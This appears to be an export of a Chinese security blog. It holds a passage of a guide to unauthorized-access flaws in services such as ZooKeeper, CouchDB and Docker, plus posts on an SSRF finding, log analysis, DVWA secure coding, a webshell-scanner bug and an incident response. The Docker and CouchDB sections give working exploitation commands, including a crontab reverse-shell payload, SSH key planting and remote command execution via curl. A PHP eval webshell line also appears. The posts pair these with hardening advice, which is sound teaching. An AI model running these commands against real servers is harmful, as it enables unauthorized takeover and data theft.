#使用admin库db.addUser(&quot;root&quot;, &quot;123456&quot;) #添加用户名root密码123456的用户db.auth(&quot;root&quot;,&quot;123456&quot;) #验证下是否添加成功，返回1说明成功 禁用HTTP和REST端口 1MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false 限制绑定IP 1234启动时加入参数--bind_ip 127.0.0.1或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1 0x05 ZooKeeper未授权访问5.1 漏洞描述Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。 5.2 漏洞利用执行以下命令即可远程获取该服务器的环境： echo envi | nc ip port 直接连接： ./zkCli.sh -server ip:port 5.3 漏洞加固 禁止把Zookeeper直接暴露在公网 添加访问控制，根据情况选择对应方式（认证用户，用户名密码） 绑定指定IP访问 0x06 Elasticsearch未授权访问6.1 漏洞描述Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据 6.2 漏洞利用漏洞检测：默认端口9200 相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。 http://x.x.x.x:9200/_nodes http://x.x.x.x:9200/_river 6.3 漏洞加固 防火墙上设置禁止外网访问此端口。 使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证 在config/elasticsearch.yml中为9200端口设置认证： 1234http.basic.enabled true #开关，开启会接管全部HTTP连接http.basic.user &quot;admin&quot; #账号http.basic.password &quot;admin_pw&quot; #密码http.basic.ipwhitelist [&quot;localhost&quot;, &quot;127.0.0.1&quot;] 0x07 Memcache未授权访问7.1 漏洞描述Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。 7.2 漏洞利用1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。 2、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在 7.3 漏洞加固 设置memchached只允许本地访问 禁止外网访问Memcached 11211端口 编译时加上–enable-sasl，启用SASL认证 0x08 Hadoop未授权访问8.1 漏洞描述由于服务器直接在开放了Hadoop机器HDFS的50070 web端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。 8.2 漏洞利用主要HDFS和MapReduce的WebUI对应的服务端口。其中比较重要的是DataNode 默认端口50075开放的话，攻击者可以通过hdsf提供的restful api对hdfs存储数据进行操作。 restful api参考：http://hadoop.apache.org/docs/r1.0.4/webhdfs.html 8.3 漏洞加固 如无必要，关闭Hadoop Web管理页面 开启身份验证，防止未经授权用户访问 设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括50070以及WebUI等相关端口，详细端口列表如下： 123456789101112131415a)HDFSNameNode 默认端口 50070DataNode 默认端口 50075httpfs 默认端口14000journalnode 默认端口 8480b)YARN（JobTracker）ResourceManager 默认端口8088JobTracker 默认端口 50030TaskTracker 默认端口 50060c)Hue 默认端口 8080d)YARN（JobTracker）master 默认端口 60010regionserver 默认端口60030e)hive-server2 默认端口 10000f)spark-jdbcserver 默认端口 10003 0x09 CouchDB未授权访问9.1 漏洞描述CouchDB默认在5984端口开放Restful的API接口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关API对服务器上的数据进行任意的增删改查，其中通过API修改local.ini配置文件，可进一步导致执行任意系统命令，获取服务器权限！ 9.2 漏洞利用新增query_server配置，这里执行ifconfig命令 curl -X PUT ‘http://x.x.x.x:5984/_config/query_servers/cmd‘ -d ‘“/sbin/ifconfig &gt;/tmp/6666”‘ 新建一个临时表，插入一条记录 curl -X PUT ‘http://x.x.x.x:5984/vultest‘ curl -X PUT ‘http://x.x.x.x:5984/vultest/vul‘ -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’ 调用query_server处理数据 curl -X POST ‘http://x.x.x.x:5984/vultest/_temp_view?limit=11‘ -d ‘{“language”:”cmd”,”map”:””}’ -H ‘Content-Type: application/json’ 当然你也可以直接执行其他命令，下载个其他什么的 9.3 漏洞加固 指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。 设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码 0x10 Docker未授权访问10.1 漏洞描述Docker Remote API是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个API，通过这个接口，我们可以新建container，删除已有的container，甚至是获取宿主机的shell 10.2 漏洞利用http://192.168.198.130:2375/v1.25/images/json 可以获取到所有的 images 列表 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，过Post包我们还可以新建、开启和关闭容器，其他操作比如拉取image等操作也都可以通过API调用完成。 12345$ curl http://10.10.10.10:2375/containers/json[]docker -H=tcp://10.10.10.10:2375 ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES Docker remote Api未授权访问的攻击原理与之前的Redis未授权访问漏洞大同小异，都是通过向运行该应用的服务器写文件，从而拿到服务器的权限，常见的利用方法如下: 1、启动一个容器，挂载宿主机的/root/目录，之后将攻击者的ssh公钥~/.ssh/id_rsa.pub的内容写到入宿主机的/root/.ssh/authorized_keys文件中，之后就可以用root账户直接登录了 2、启动一个容器，挂载宿主机的/etc/目录，之后将反弹shell的脚本写入到/etc/crontab中，攻击者会得到一个反弹的shell，其中反弹shell脚本的样例如下：1echo -e &quot;*/1 * * * * root /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot; &gt;&gt; /etc/crontab 第2种利用方法也可以挂载var/spool/cron/目录，将反弹shell的脚本写入到/var/spool/cron/root（centos系统）或/var/spool/cron/crontabs/root(ubuntu系统) 10.3 漏洞加固 在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式： 12设置ACL，仅允许信任的来源IP连接；设置TLS认证，官方的文档为Protect the Docker daemon socket 客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1 123export DOCKER_CERT_PATH=~/.dockerexport DOCKER_HOST=tcp://10.10.10.10:2375export DOCKER_API_VERSION=1.12 在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证 附：Python未授权访问脚本参考文章https://www.secpulse.com/archives/55928.html https://www.secpulse.com/archives/49115.html https://www.secpulse.com/archives/6540.html https://xianzhi.aliyun.com/forum/mobile/read/750.html https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html https://www.secpulse.com/archives/2166.html https://github.com/findys/sunburst/ https://yeasy.gitbooks.io/docker_practice/ 安全脉搏链接未授权访问漏洞总结]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>未授权访问</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全脉搏漏洞挖掘小记]]></title>
    <url>%2F2017%2F08%2F07%2F%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[不知道大家之前对安全脉搏打开的时候是不是感觉响应很慢，所以最近一直在排查，然后重新更换wordpress主题进行改版升级。在对安全脉搏进行维护、更新的时候，偶然之间发现了脉搏上的几个漏洞，在此记录下。 首先，打开主页。 打开某个网站不知道大家有什么习惯，但是作为一个”程序员”的我来说(伪程序员,我最喜欢有人叫我程序员了)，F12没关过。[斜眼笑] 不知道大家看这个图之后敏不敏感，反正我是挺敏感的(让我装个逼)。不知道为啥，这么久了竟然没人发现… 要是你你咋玩，首先我来了个百度https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png&amp;h=304&amp;w=504&amp;zc=1 惊喜来了，竟然把网站绝对路径报出来了！信息比较敏感，我就不放图了。 这就存在两个漏洞了： 没有关闭错误回显 没有对src参数的静态文件链接作校验 然后看到src参数，大家会想到啥，没错！SSRF！ 来一波试试 没毛病！ 然后我就想着 这是不是个通用漏洞啊，没准拿个CVE呢(不要揭穿我，让我意淫一会)，然后我搜了下，竟然真没有这个插件的SSRF漏洞，但是！！！悲伤的是我发现竟然不维护更新了。。。好吧。。 然后搜了一下这个插件的其他漏洞，竟然发现个命令执行！嘿嘿嘿嘿嘿。。。 不说了，四爷在我身边呢，我怕被打死。 PS:大家不要玩了，已经修复了。。。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>命令执行</tag>
        <tag>漏洞挖掘</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[看我如何用20行代码做日志分析]]></title>
    <url>%2F2017%2F07%2F29%2F%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E7%94%A820%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%81%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[不管是渗透测试、应急响应还是运维，日志分析都万分重要。而linux下日志分析最好的工具那就是linux自带的各种命令了。本文将从一个小例子来介绍”如何用linux命令做日志分析”。 0x00 源码1234567891011121314151617181920212223242526272829#!/bin/bashif ls ./*.result &amp;&gt; /dev/nullthen rm *.resultfitouch log.resultfor i in www-*.logdo echo $i ... awk &apos;$9 == 200 &#123;print $7&#125;&apos; $i|grep -i &apos;^/admin/upload/.*\.html$&apos;|sort|uniq -c|sed &apos;s/^ *//g&apos; &gt; $i.result cat $i.result &gt;&gt; log.result echo $i.result finisheddoneecho final.log.result ...sort -k2 log.result | uniq -f1 --all-repeated=separate |./log.awk |sort -rn &gt; final.log.resultecho final.log.result finishedlog.awk#!/usr/bin/awk -fBEGIN&#123; RS=&quot;&quot;&#125; &#123; sum=0 for(i=1;i&lt;=NF;i++)&#123; if((i%2)!=0)&#123; sum += $i&#125; &#125; print sum,$2 &#125; 0x01 Apache日志以apache日志为例，下面是三条普通的apache日志记录。12358.40.124.211 - - [25/Jul/2017:08:53:12 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html HTTP/1.1&quot; 200 4649 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;58.40.124.211 - - [25/Jul/2017:08:53:12 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/js/jquery-2.2.4.min.js HTTP/1.1&quot; 200 85578 &quot;http://121.43.182.76/vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;58.40.124.211 - - [25/Jul/2017:08:53:13 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/favicon.ico HTTP/1.1&quot; 200 1517 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot; 58.40.124.211表示访问者IP，25/Jul/2017:08:53:12 +0800表示时间，GET表示请求方法，vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html表示访问的地址，HTTP/1.1表示使用HTTP协议的1.1版本，200表示响应状态码，Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0表示访问者user-agent 我们分析一般关注的主要就是： IP地址 访问的地址 状态码 本次就只演示获取某个地址的访问量并排序，即：访问量 地址这种效果。 0x02 思路Apache日志文件格式形如201707029.log,根据文件格式设计总体思路如下: 处理每天的日志，统计每日文章访问量 生成每月访问结果，统计月度访问量 生成每年访问结果，统计年度访问量 0x03 命令解析0x03.1 awkawk &#39;$9 == 200 {print $7}&#39; $i awk默认是以空格作为分隔符，$9表示匹配是200的响应，打印出第七个字段 0x03.2 grepgrep -i &#39;^/admin/upload/.*\.html$&#39; 根据awk匹配的结果，匹配访问的地址是/admin/upload/.*\.html的记录。i表示不区分大小写，^$是正则表达式的开头结尾。 0x03.3 sortsort -k2 log.result 由于合成的记录是无序的，所以要将相同的归类。但是第一字段是访问次数，所以使用k2参数根据网址排序。sort -rn &gt; final.log.result 对awk脚本的处理结果进行排序，sort默认使用第一个字段，参数r表示逆序，从大往小排；参数n表示以数值形式排序 0x03.4 uniquniq -c 使用uniq过滤重复的记录，-c表示添加该记录出现的次数。uniq -f1 --all-repeated=separate 参数f1表示忽略第一个字段（访问次数），只考虑后面的字段（网址）。参数all-repeated=separate，表示过滤掉所有只出现一次的记录，保留所有重复的记录，并且每一组之间用一个空行分隔 0x03.5 sedsed &#39;s/^ *//g&#39; &gt; $i.result 由于uniq过滤后每条记录前面都是有空格的，所以要先删除掉。sed命令是一个处理行文本的编辑器，&#39;s/^ *//g&#39;是一个正则表达式(^和*之间有一个空格)表示每行记录的空格替换为空（即删除）并将排序结果重定向到文件。 0x03.6 &gt;和&gt;&gt;&gt;表示重定向，即输出覆盖，&gt;&gt;也是重定向，但是是表示追加 0x03.7 log.awk首先，默认情况下，awk将”\n”作为记录的分隔符，设置RS=””表示改为将空行作为分隔符其次，NF是一个awk的内置变量，表示当前行的字段总数。由于输入文件之中，每一行都包含两个字段，第一个是访问数，第二个是网址，所以这里做一个条件判断，只要是奇数字段就累加，偶数字段则一律跳过。最后，每个记录输出一个累加值和网址，它们之间用空格分割。 参考文章：http://www.cnblogs.com/51linux/archive/2012/05/23/2515299.htmlhttp://blog.csdn.net/long2746004900/article/details/53367353http://www.cnblogs.com/wangqiguo/p/5863266.htmlhttp://blog.csdn.net/github_33736971/article/details/54286736http://blog.csdn.net/wenxuechaozhe/article/details/52564394http://www.cnblogs.com/dong008259/archive/2011/12/07/2279897.html]]></content>
      <tags>
        <tag>编程</tag>
        <tag>自动化</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
        <tag>日志分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跟着DVWA学Web安全开发]]></title>
    <url>%2F2017%2F07%2F10%2F%E8%B7%9F%E7%9D%80DVWA%E5%AD%A6Web%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[本文已发布到“安全脉搏”，原文链接：https://www.secpulse.com/archives/59262.html 0x00 前言 DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 本文将从DVWA中包含的各种漏洞来学习基本的Web安全开发中的需要注意的问题，本文旨在为Web开发中的新手提供一些安全指南，抛砖引玉，望大牛们多多指点。 0x01 SQL注入1、使用mysql_real_escape_string函数，不要使用addslashesmysql_escape_string已经被弃用，主要说下mysql_real_escape_string和addslashes的区别1.1 这两个函数都会对&#39;、&quot;、\和\x00进行转义处理，除此之外mysql_real_escape_string还会对\r、\n和\x1a进行转义。1.2 在字符集为GBK时，0xbf27不是一个合法的多字节字符，但0xbf5c却是,若我们输入0xbf27addslashes会将它修改为0xbf5c27，0xbf5c会被当作单字节字符，所以成功注入一个单引号，这就是宽字节注入。2、使用is_numeric函数，但是如果单使用is_numeric函数是不行的，因为使用十六进制、科学记数法即可轻松绕过。3、使用PDO技术，PDO是PHP数据对象（PHP Data Object）的缩写，即使用它的准备语句（Prepared Statements，即“参数化查询”）。举个例子：1234567$Statement = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;);$id = 18;$name = &apos;w2n1ck&apos;;$Statement-&gt;bindParam(1,$id);$Statement-&gt;bindParam(2,$name);$Statement-&gt;execute();$Statement-&gt;fetchAll(); PHP会将将SQL模板select * from info where id =? and name = ?和变量bindParam(1,$id);bindParam(2,$name);分两次发送给MySQL，由MySQL完成变量的转义处理，然后进行参数字符串匹配即可。(PS：之前还了解了语义分析防SQL注入，一直觉得PDO很好了，为啥还要语义分析，后来才恍然大悟，PDO是对开发的，语义分析人家是为了卖产品，mdzz)4、DVWA里面还加了Anti-CSRF token验证，进一步提高了系统安全性 0x02 XSS(跨站脚本)DVWA中XSS防护流程步骤代码如下：12345$message = trim( $_POST[ &apos;mtxMessage&apos; ] );Sanitize message input$message = stripslashes( $message );$message = mysql_real_escape_string( $message );$message = htmlspecialchars( $message ); 1、使用trim函数，trim函数移除字符串两侧的空白字符或其他预定义字符。因为有时候我们会使用\t、\n、\r&quot;等尝试绕过。2、使用stripslashes,删除由 addslashes()函数添加的反斜杠。3、使用mysql_real_escape_string转义一些特殊的字符。4、使用htmlspecialchars把特殊字符&amp;,&quot;,&#39;,&lt;,&gt;替换为HTML实体&amp;amp;&amp;quot;&amp;#039;&amp;lt;&amp;gt;,但我们还是可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS123456&lt;a href=&quot;&lt;?php echo htmlspecialchars(&quot;javascript:alert(1)&quot;,ENT_QUOTES); ?&gt;&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;&lt;?php echo htmlspecialchars(&quot;javascript:location%3Dhttp%3A%2F%2Fwww.baidu.com&quot;,ENT_QUOTES); ?&gt;&quot;&gt;test&lt;/a&gt; 总结：对输入(URL参数)进行过滤；对输出进行编码；白名单和黑名单结合； 0x03 文件上传DVWA中文件安全上传的流程： 1、取文件最后的扩展名1$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); 2、对上传文件的文件名做随机数重命名操作DVWA用的是MD5，rand()函数也可以1$target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; 3、采取白名单方式验证文件的后缀名，MIME-TYPE类型，以及文件大小123if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; 4、检查是否为真正图片1getimagesize( $uploaded_tmp ) 5、使用GD库或image-magick进行二次渲染二次渲染，清除图片中的恶意代码1$img = imagecreatefromjpeg( $uploaded_tmp ); 6、回显相对路径1if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) DVWA中只是从代码设计层面考虑文件上传的安全性，比如还有Nginx与Apache的解析漏洞，截断问题，.htaccess,.user.ini后门,windows特性，ADS流，RTLO技术，包含漏洞等等。 0x04 文件包含DVWA中的文件包含直接写死了就那几个文件，简单粗暴。。。 这里举一些需要注意的点： 使用open_basedir配置，限制文件目录 过滤./,注意不是../，因为可以使用..././..././绕过 禁止服务器远程文件包含,allow_url_fopen=Off与allow_url_include=Off 注意php://input,data://等各种伪协议问题 注意截断问题，比如%00截断,超长路径截断，点号截断12345678910111213file:///var/www/html 访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问FTP(s) URLsdata:// 数据流http:// — 访问 HTTP(s) URLsphp://input — 访问各个输入/输出流zlib:// — 压缩流glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流php://filter/ 0x05 命令执行DVWA中是以ping命令为例12$octet = explode( &quot;.&quot;, $target ); //以点号进行分割if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) //判断每个部分是否是数字，同时size是否为4 这里举一些需要注意的点： 1.尽量少用执行命令的函数或者直接禁用2.参数值尽量使用引号包裹3.在使用动态函数之前，确保使用的函数是指定的函数之一4.在进入执行命令的函数、方法之前，对参数进行过滤，对敏感字符进行转义，PHP中使用escapeshellcmd函数 escapeshellcmd对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符 之前进行转义。 特殊字符有`#,&amp;,;反引号,|,*,?,~,&lt;,&gt;,^,(,),[,],{,},$,x0A,x00和xFF`。&apos;和&quot;仅在不配对的时候被转义。在Windows平台上以前缀`^`来转义的 0x06 CSRF(跨站请求伪造)DVWA中的CSRF是以改密码为例。 1、验证token这是一个非常有效的手段，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。12// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 2、二次确认12345678910// Get input$pass_curr = $_GET[ &apos;password_current&apos; ];...// Check that the current password is correct$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );$data-&gt;execute();// Do both new passwords match and does the current password match the user?if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) )&#123;&#125; 二次确认就是在调用某些功能时进行二次验证，如：删除用户时，产生一个提示对话框，提示”确定删除用户吗？”,转账操作时，要求用户输入二次密码。 3、验证码这是一个非常简单并且有效的防御CSRF的方法。 0x07 暴力破解1、增加验证码，token等验校字段DVWA中加入了Anti-CSRFtoken预防无脑爆破。 2、增加sleep操作只要登陆失败，则延迟3秒，大大降低了爆破速度12// Login failedsleep( rand( 2, 4 ) ); 3、增加登陆错误机制单用户，登陆次数错误到一定次数，即锁定该账户。此外还可以对用户IP等进行频次限制。 0x08 验证码验证码主要会出现一些逻辑漏洞，最常见的有两种： 验证过程分两步，先验证验证码是否正确，正确则进行下一步 验证码没有设置有效时间，导致可以重复使用 参考链接：http://www.jb51.net/article/56612.htmhttp://www.freebuf.com/author/lonehandhttp://www.cnblogs.com/Hyber/p/6133196.htmlhttp://www.am0s.com/functions/227.html]]></content>
      <tags>
        <tag>编程</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>安全开发</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记D盾_Web查杀中的一个Bug]]></title>
    <url>%2F2017%2F07%2F07%2F%E8%AE%B0D%E7%9B%BE-Web%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AABug%2F</url>
    <content type="text"><![CDATA[公司最近的接的项目，需要对40000个webshell样本分析，由于时间紧，也没写东西，先拿D盾凑合着用一次吧，记使用过程中遇到的一个bug。大家看这个图片 D盾报的等级才是“1”，我们看下file_put_contents函数。12345678910file_put_contents(file,data,mode,context)file 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。data 可选。规定要写入文件的数据。可以是字符串、数组或数据流。mode 可选。规定如何打开/写入文件。可能的值： FILE_USE_INCLUDE_PATH FILE_APPEND LOCK_EXcontext 可选。规定文件句柄的环境。 context 是一套可以修改流的行为的选项。若使用 null，则忽略。 很明显，这个文件的名字要看后端怎么处理，如果是接收POST参数中的“K”，那就是自定义文件名了，就是不是，肯定也是会创建一个新的文件而文件内容就是&lt;?php eval($_POST[k]);?&gt;。 这种很明显不是正常操作啊，但是D盾竟然报等级为“1”！我们使用的时候 有时候会经常忽略等级“3”以下的文件，这就很危险啊。 我猜测：可能是由于D盾的策略是只要在他的规则里出现，就显示出来出现的第一条的那个等级。这明显不符合常理啊！ 最起码要做个全文检测，然后把最高等级的给显示出来，这样，用户再人工排查，就不会出现漏报的情况了。（绕的咱就暂且不说）]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>webshell</tag>
        <tag>应急响应</tag>
        <tag>D盾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次奇葩的应急响应]]></title>
    <url>%2F2017%2F06%2F26%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E8%91%A9%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%2F</url>
    <content type="text"><![CDATA[上上上周末真是个不平凡的周末，周六公司举办“脉搏涌动”沙龙，虽然忙点，但是也是学到很多，况且还是自己第一次参加安全相关的会议。然后周末上午赶忙完成四爷安排的安全脉搏上的任务，写了个文章发到“安全脉搏”上。下午刚要出去吃饭，工作来了。。。先说下自己在沙龙上学到的 URL跳转的时候可以用\@绕过，\是利用浏览器和后端解析差异，@这个之前在ssrf上绕过用 /%0a/这种形式可绕过一些目录限制以便进行其他操作，之前都用到crlf，waf等上 搜索敏感信息听说bing更强大，小伙伴还给我推荐了DuckDuckGo 总结起来就是：太年轻，年轻，轻。。。[捂脸][捂脸][捂脸] 好了，说下这次的应急响应及自己的思考。感谢加菲猫、四爷带我，跪拜啊！ 0x00 事件描述客户反馈从6月23日开始，网站访问延迟很大，重启服务之后会越来越慢，直至502。网站使用LNMP集成环境，服务器及数据库不是弱口令。6月25号客户买了相关安全产品，未发现明显的恶意攻击行为，同时服务器性能良好。 0x01 事件处理过程首先我的第一反应是被D了，使用top发现服务器性能正常。 然后客户也买了产品，产品上也未出现异常。 然后使用了下自己做的信息收集的linux_信息收集.sh，搜集了下相关信息，查看也并没发现什么异常。 使用了Python版的webshell查杀，也TM没发现啥，各种看日志也并没发现什么卵用，这TM我就崩溃了。。。 然后我又考虑是不是Slow HTTP DDos，但是没办法验证啊。 本地复现的话客户肯定不让啊，无助啊。。。 没办法只能继续分析，然后事件出现了转机： 服务会呈现两种情况： http资源未被占尽的情况下，可以访问静态资源以及直接查sql的路由链接，如：12http://xxx/wap/test.css?v=1http://xxx/phpmyadmin/index.php http资源完全被占满，导致静态资源都不能访问，查询进程会发现最大50个httpd进程全启动了。 由于最大只允许50个进程，所以导致这个时候静态和动态的资源都无法进行访问了。检查nginx日志，log中有大量的499状态码，这个是由于客户端等待超时，关闭了链接导致。 暂且在proxy.conf中新增了proxy_ignore_client_abort on; 重启后，不在有客户端主动关闭链接的情况。 检查部分链接源代码函数，如在资源未占满情况下，访问此phpmyadmin/index.php请求是没问题的： http://xxx/xxx/ajax.php 定位到/data/wwwroot/xxx/ajax.action.php文件，查看后发现就是一个简单的sql查询，然后打印了json。 然后访问 “找回密码链接” 每次延迟时间都在28.19秒左右，如下： http://xxx/finduser/findpassword 于是定位到该方法的源代码函数位置，在渲染模版前，尝试die(&#39;111111&#39;);发现很快能显示111111 12345vi ./xxx/finduser.action.php$title = &quot;找回密码&quot;;die(&apos;1111111&apos;);include templates(&quot;mobile/user&quot;, &quot;findpassword&quot;); 这说明模版在渲染前是没有问题的。 上边两步也就说明了： 不会是攻击的造成的。 sql查询没问题。 之后猜测两种情况： 可能是缓存超时 也可能是连接某个第三方接口超时出现的问题 重新刷新页面，并同时查看端口syn_send情况，果然发现了问题： netstat -anp|grep -i syn_sent|awk &#39;{print $5}&#39;|sort|uniq 12140.207.119.12:44358.246.220.31:443 每访问加载慢的页面，就会多一个这个ip的链接出来。浏览器访问后，发现ssl标识是微信的接口。 api.weixin.qq.com -&gt; 58.246.220.31上边这个在服务器上是ping不通的。查看了下服务器上调用该api的文件。 find ./ -type f -name &quot;*.php&quot;|xargs grep &quot;api.weixin.qq.com&quot; 注释掉/xxx/jssdk.class.php等页面中的api.weixin.qq.com访问不在慢了。 至此，事件问题定位成功。 0x02 安全建议 最简单的，修改/etc/hosts。 和微信方取得联系，解封对api.weixin.qq.com的ip限制。 定位所有调用的api接口，看看还有哪些在服务器上是不能访问的，并进行替换。 0x03 事件思考事后我们和客户交流，客户反馈：由于不可描述的原因，可能用户举报了他们，所以可能是这样导致他们微信API被封。 事后想了想，这TM思路真是猥琐啊！！！ 然后联想到之前猪猪侠小密圈说的 所以，我们就可以利用这点，比如系统需要请求第三方API，那我们就可以构造恶意payload让服务器发送恶意的包或者频繁请求相关API，那么此接口就会被封掉，那么业务就崩了！]]></content>
      <tags>
        <tag>运维</tag>
        <tag>渗透测试</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux下DDos攻击处理方法]]></title>
    <url>%2F2017%2F06%2F18%2Flinux%E4%B8%8BDDos%E6%94%BB%E5%87%BB%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%2F</url>
